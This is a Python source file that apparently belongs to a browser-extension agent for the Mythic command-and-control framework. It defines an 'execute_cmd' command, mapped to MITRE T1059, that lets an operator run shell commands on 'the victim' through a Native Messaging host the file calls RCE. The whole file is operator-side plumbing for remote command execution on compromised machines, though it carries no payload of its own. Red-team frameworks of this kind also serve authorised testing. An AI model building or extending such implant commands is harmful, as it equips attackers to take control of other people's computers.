from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class ExecuteCmdArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description=(
                    "Shell command to run on the victim. Requires the RCE "
                    "native host (com.site.agent) to be installed. Quote "
                    "multi-word commands, e.g. 'whoami /all'."
                ),
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class ExecuteCmdCommand(CommandBase):
    cmd = "execute_cmd"
    needs_admin = False
    help_cmd = "execute_cmd [command]"
    description = (
        "Execute a shell command on the victim via the Native Messaging host "
        "(RCE). Only functional when the payload was built with enable_rce=true."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1059"]
    argument_class = ExecuteCmdArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
